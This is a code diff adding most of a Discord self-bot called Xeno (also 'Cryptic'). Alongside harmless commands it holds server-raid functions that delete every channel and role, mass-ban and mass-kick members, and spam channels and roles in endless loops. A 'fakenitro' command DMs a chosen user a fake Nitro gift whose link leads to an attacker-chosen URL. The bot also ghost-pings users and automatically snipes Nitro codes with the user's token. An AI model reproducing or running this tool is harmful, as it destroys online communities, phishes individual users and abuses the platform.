+      var hrs = Math.floor((ms / 1000 / 60 / 60) % 24);
+      var day = Math.floor((ms / 1000 / 60 / 60 / 24) % 7);
+      var wks = Math.floor((ms / 1000 / 60 / 60 / 24 / 168) >> 0);
+
+      var secInfo = null;
+      var minInfo = null;
+      var hrsInfo = null;
+      var dayInfo = null;
+      var wksInfo = null;
+      if (sec === 1) {
+        secInfo = " second ";
+      } else {
+        secInfo = " seconds ";
+      }
+      if (min === 1) {
+        minInfo = " minute, and ";
+      } else {
+        minInfo = " minutes, and ";
+      }
+      if (hrs === 1) {
+        hrsInfo = " hour, ";
+      } else {
+        hrsInfo = " hours, ";
+      }
+      if (day === 1) {
+        dayInfo = " day, ";
+      } else {
+        dayInfo = " days, ";
+      }
+      if (wks === 1) {
+        wksInfo = " week, ";
+      } else {
+        wksInfo = " weeks, ";
+      }
+
+      if (sec === 0) {
+        sec = null;
+        secInfo = null;
+      }
+      if (min === 0) {
+        min = null;
+        minInfo = null;
+      }
+      if (hrs === 0) {
+        hrs = null;
+        hrsInfo = null;
+      }
+      if (day === 0) {
+        day = null;
+        dayInfo = null;
+      }
+      if (wks === 0) {
+        wks = null;
+        wksInfo = null;
+      }
+
+      var uptime =
+        wks +
+        wksInfo +
+        day +
+        dayInfo +
+        hrs +
+        hrsInfo +
+        min +
+        minInfo +
+        sec +
+        secInfo;
+      // var timeZone = new Date().toString().match(/\(([A-Za-z\s].*)\)/)[1]
+      let embed = new Discord.RichEmbed()
+        .setTitle("Uptime")
+        .addField(
+          "Online for:",
+          `${uptime} | Since ${moment()
+            .subtract(bot.uptime, "ms")
+            .format("L LTS")}`
+        )
+        .setThumbnail(
+          image
+            ? image
+            : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+        )
+        .setColor(color ? color : "#ff0000")
+        .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+      message.channel.send(embed);
+    }
+
+    if (cmd === "delchannels") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("MANAGE_CHANNELS"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      message.guild.channels.forEach((channel) => {
+        channel.delete();
+      });
+    }
+
+    if (cmd === "delroles") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("MANAGE_ROLES"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      message.guild.roles.forEach((role) => {
+        role.delete();
+      });
+    }
+
+    if (cmd === "masschannels") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("MANAGE_CHANNELS"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      setInterval(() => {
+        message.guild.createChannel("raided-by-cryptic", {
+          type: "text",
+        });
+      });
+    }
+
+    if (cmd === "massban") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("BAN_MEMBERS"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      message.guild.members.forEach((member) => {
+        member.ban({ reason: "Raided by Cryptic" });
+      });
+    }
+
+    if (cmd === "masskick") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("KICK_MEMBERS"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      message.guild.members.forEach((member) => {
+        member.kick("Raided by Cryptic");
+      });
+    }
+
+    if (cmd === "massroles") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild.me.hasPermissions("MANAGE_ROLES"))
+        return console.log(
+          `${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`
+        );
+      setInterval(() => {
+        message.guild.createRole({
+          name: "raided by Cryptic",
+          color: "RANDOM",
+        });
+      });
+    }
+
+    if (cmd === "fakenitro") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      function nitroCode() {
+        let code = "";
+        let dict =
+          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for (var i = 0; i < 19; i++) {
+          code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+        }
+        return code;
+      }
+      if (args[0].length > 18 || args[0].length < 18)
+        return message.channel.send("That is not a valid id.");
+      if (!args[0]) return message.channel.send("Please specify a user id.");
+      if (!args[1])
+        return message.channel.send("Please specify a redirect url");
+      message.channel.send("Done!");
+      let embed = new Discord.RichEmbed()
+        .setAuthor(
+          "Free Discord Nitro",
+          "https://i.gyazo.com/80906ef5fe2f571b352ed3cbe53734ef.png"
+        )
+        .setTitle(
+          "Congratulations, you have received a free discord nitro gift"
+        )
+        .setThumbnail(
+          image
+            ? image
+            : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+        )
+        .setColor(color ? color : "#ff0000")
+        .setTimestamp()
+        .addField(
+          "Redeem Here:",
+          `[https://discord.gift/${nitroCode()}](${args[1]})`
+        );
+      message.guild.members.get(args[0]).send(embed);
+    }
+
+    if (cmd === "ghostping") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const userID = args[0];
+      const msg = args.slice(1).join(" ");
+      if (!userID) return message.channel.send("Please specify a user id.");
+      if (!msg) return message.channel.send("Please specify a message.");
+      message.channel.send(
+        `${msg}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||<@!${userID}>`
+      );
+    }
+
+    if (cmd === "everyone") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send(
+        "<https://google.com> \u200b||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone"
+      );
+    }
+
+    if (cmd === "8ball") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      let question = args.join(" ");
+      if (!question)
+        return message.channel.send(
+          "Please provide a question to ask the 8ball."
+        );
+      let responses = [
+        "As I see it, yes.",
+        "Ask again later.",
+        "As I see it, yes.",
+        "Better not tell you now.",
+        "Cannot predict now.",
+        "Concentrate and ask again.",
+        "Don’t count on it.",
+        "It is certain.",
+        "It is decidedly so.",
+        "Most likely.",
+        "My reply is no.",
+        "My sources say no.",
+        "Outlook not so good.",
+        "Outlook good.",
+        "Reply hazy, try again.",
+        "Signs point to yes.",
+        "Very doubtful.",
+        "Without a doubt.",
+        "Yes.",
+        "Yes – definitely.",
+        "You may rely on it.",
+      ];
+      let response = responses[Math.floor(Math.random() * responses.length)];
+      if (enabled === true) {
+        let eightballEmbed = new Discord.RichEmbed()
+          .setTitle("The Magic 8 Ball has spoken")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .addField("Question:", question, true)
+          .addField("Response:", response, true);
+        message.channel.send(eightballEmbed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+              The Magic 8 Ball has spoken
+              Question: ${question}
+              Response: ${response}${footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"}
+              \`\`\``);
+      }
+    }
+
+    if (cmd === "botinfo") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setThumbnail(
+            "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor("#ff0000")
+          .setFooter("𝙓𝙚𝙣𝙤")
+          .setTitle("Xeno")
+          .setDescription("Xeno is a discord user automation tool")
+          .addField("Developer", "Xeno#0538", true)
+          .addField("Node.js Version", process.version, true)
+          .addField("Discord.js Version", Discord.version, true)
+          .addField("Bot Version", require("./package.json").version, true)
+          .addField("Past Names", "Cryptic, Diamond", true);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Xeno
+            Xeno is a discord user automation tool
+
+            Developer: Xeno#0538
+            Node.js Version: ${process.version}
+            Discord.js Version: ${Discord.version}
+            Bot Version: ${require("./package.json").version}
+            Past Names: Cryptic, Diamond\n\n𝙓𝙚𝙣𝙤
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "binary") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args[0])
+        return message.channel.send(
+          "Uknown parameter. Please choose the method first, either decode or encode it"
+        );
+
+      let choice = ["encode", "decode"];
+      if (!choice.includes(args[0].toLowerCase()))
+        return message.channel.send(
+          "Uknown parameter. Please choose the method first, either decode or encode it"
+        );
+
+      let text = args.slice(1).join(" ");
+
+      if (!text) return message.channel.send("Please provide some text");
+
+      if (text.length > 1024)
+        return message.channel.send(
+          "Your text is to long. The maximum amount of characters is `1,024`"
+        );
+
+      function encode(char) {
+        return char
+          .split("")
+          .map((str) => {
+            const converted = str.charCodeAt(0).toString(2);
+            return converted.padStart(8, "0");
+          })
+          .join(" ");
+      }
+
+      function decode(char) {
+        return char
+          .split(" ")
+          .map((str) => String.fromCharCode(Number.parseInt(str, 2)))
+          .join("");
+      }
+
+      if (args[0].toLowerCase() === "encode") {
+        return message.channel.send(encode(text));
+      } else if (args[0].toLowerCase() === "decode") {
+        return message.channel.send(decode(text));
+      }
+    }
+
+    if (cmd === "stream") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const msg = args.join(" ");
+      bot.user.setActivity(msg, {
+        type: "STREAMING",
+        url: "https://www.twitch.tv/cryptic",
+      });
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(
+            `Your activity was successfully set to \`STREAMING\` with message \`${msg}\``
+          );
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Success
+
+            Your activity was successfully set to STREAMING with message ${msg}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "watching") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const msg = args.join(" ");
+      bot.user.setActivity(msg, { type: "WATCHING" });
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(
+            `Your activity was successfully set to \`WATCHING\` with message \`${msg}\``
+          );
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Success
+
+            Your activity was successfully set to WATCHING with message ${msg}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "listening") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const msg = args.join(" ");
+      bot.user.setActivity(msg, { type: "LISTENING" });
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(
+            `Your activity was successfully set to \`LISTENING\` with message \`${msg}\``
+          );
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Success
+
+            Your activity was successfully set to STREAMING with LISTENING ${msg}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "playing") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const msg = args.join(" ");
+      bot.user.setActivity(msg, { type: "PLAYING" });
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(
+            `Your activity was successfully set to \`PLAYING\` with message \`${msg}\``
+          );
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Success
+
+            Your activity was successfully set to PLAYING with message ${msg}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "reset") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      bot.user.setActivity(null);
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+          .setDescription(`Your activity was successfully reset`);
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            Success
+
+            Your activity was successfully reset${
+              footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+            }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "clear") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("\u200b\n".repeat(400));
+    }
+
+    if (cmd === "reverse") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please provide some text.");
+      message.channel.send(args.join(" ").split("").reverse().join(""));
+    }
+
+    if (cmd === "ascii") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please provide some text!");
+      msg = args.join(" ");
+
+      figlet.text(msg, function (err, data) {
+        if (err) {
+          console.log(`Uh Oh, an error has occurred. Error ${err}`);
+        }
+        if (data.length > 2000)
+          return message.reply(
+            "Please provide text shorter that 2000 characters."
+          );
+
+        message.channel.send("```" + data + "```");
+      });
+    }
+  } else {
+    return;
+  }
+});
+
+bot.on("messageDelete", (message) => {
+  if (message.author.bot) return;
+  const snipes = bot.snipes.get(message.channel.id) || [];
+  snipes.unshift({
+    content: message.content,
+    author: message.author,
+    attachment: message.attachments.first()
+      ? message.attachments.first().proxyURL
+      : null,
+    date: new Date().toLocaleString("en-GB", {
+      dataStyle: "full",
+      timeStyle: "short",
+    }),
+  });
+  snipes.splice(10);
+  bot.snipes.set(message.channel.id, snipes);
+});
+
+bot.on("message", async (message) => {
+  if (message.channel.type === "dm") {
+    if (afkMode === true) {
+      message.channel.send(
+        config.afk_message
+          ? config.afk_message
+          : "Hey there, I am currently afk. Try dming me later! :slight_smile:"
+      );
+    } else {
+      return;
+    }
+  }
+
+  const start = process.hrtime();
+  const difference = process.hrtime(start);
+
+  const time = new Date().toLocaleString("en-GB", {
+    dataStyle: "full",
+    timeStyle: "short",
+  });
+
+  function nitroData(code) {
+    console.log(`- CHANNEL: ${colors.yellow(`${message.channel.name}`)}`);
+    console.log(`- SERVER: ${colors.yellow(`${message.guild.name}`)}`);
+    console.log(`- AUTHOR: ${colors.yellow(`${message.author.tag}`)}`);
+    console.log(
+      `- ELAPSED: ${colors.yellow(
+        `${difference[0] > 0 ? `${difference[0]}s ` : ""}${
+          difference[1] / 1e6
+        }ms`
+      )}`
+    );
+    console.log(`- CODE: ${colors.yellow(`${code}`)}`);
+    console.log();
+  }
+
+  function giveawayData() {
+    console.log(`- CHANNEL: ${colors.yellow(`${message.channel.name}`)}`);
+    console.log(`- SERVER: ${colors.yellow(`${message.guild.name}`)}`);
+    console.log();
+  }
+
+  if (message.content.includes("GIVEAWAY")) {
+    if (config.giveaway_sniper === true) {
+      if (message.author.id === "294882584201003009") {
+        try {
+          message.react("🎉");
+          console.log(`${colors.cyan(`[${time} - Giveaway Sniped]`)}`);
+          giveawayData();
+        } catch (err) {
+          console.log(`${colors.cyan(`[${time} - Giveaway Couldn't React]`)}`);
+        }
+      }
+    } else {
+      return;
+    }
+  }
+
+  if (message.content.includes(`Congratulations <@${bot.user.id}>`)) {
+    if (config.giveaway_sniper === true) {
+      if (message.author.id === "294882584201003009") {
+        console.log(`${colors.cyan(`[${time} - Giveaway Sniped]`)}`);
+        giveawayData();
+      }
+    } else {
+      return;
+    }
+  }
+
+  if (
+    message.content.includes("https://discord.gift/") ||
+    message.content.includes("discord.gift")
+  ) {
+    if (config.nitro_sniper === true) {
+      var Nitro = /(discord\.(gift)|discord\.com\/gift)\/.+[a-z]/;
+
+      var NitroUrl = Nitro.exec(message.content);
+      var NitroCode = NitroUrl[0].split("/")[1];
+
+      axios({
+        method: "POST",
+        url: `https://discord.com/api/v6/entitlements/gift-codes/${NitroCode}/redeem`,
+        headers: {
+          Authorization: config.token,
+        },
+      })
+        .then(() => {
+          console.log(
+            colors.green(
+              `[${time} - Valid nitro code was successfully redeemed]`
+            )
+          );
+          nitroData(NitroCode);
+        })
+        .catch((ex) => {
+          console.log(
+            colors.red(
+              `[${time} - Unknown nitro code was either redeemed or invalid/fake]`
+            )
+          );
+          nitroData(NitroCode);
+        });
+    } else {
+      return;
+    }
+  }
+});
+
+if (config.token === "token-here") {
+  return console.log(
+    `${colors.red("[ERROR]:")} ${colors.yellow(
+      "You didn't specify a token in config.json"
+    )}`
+  );
+} else {
+  bot
+    .login(config.token)
+    .catch((err) =>
+      console.log(`${colors.red("[ERROR]:")} ${colors.yellow("Invalid Token")}`)
+    );
+}
